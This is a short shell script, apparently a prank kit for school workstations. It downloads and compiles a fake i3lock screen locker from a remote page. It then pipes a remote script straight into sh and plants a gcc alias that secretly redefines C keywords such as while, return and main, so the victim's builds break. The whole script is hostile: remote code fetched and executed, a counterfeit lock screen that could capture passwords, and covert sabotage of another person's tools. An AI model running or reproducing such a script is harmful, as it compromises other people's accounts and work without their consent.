#!/bin/sh

tempdir=$(mktemp -d)
cd "$tempdir"
curl "https://d-002.github.io/epita/confloose/fake-i3lock/i3lock.c" >> "$tempdir/i3lock.c"
i3lock_path=$(which i3lock | sed "s|/|\\\\/|g")
sed -i "s/I3LOCK_PATH/$i3lock_path/" i3lock.c
gcc -o i3lock i3lock.c -std=c99

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-gcc" "'alias gcc=\"gcc -Dwhile=if -Dshort=long -Dconst= -Dtrue=0 -Dfalse=1 -Dmalloc=calloc -Di=j -Dreturn=\\\"return 127;return\\\" -Dfor=\\\"for(;;)for\\\" -Dmain=\\\"main(void){}int main2\\\"\"'" | sh
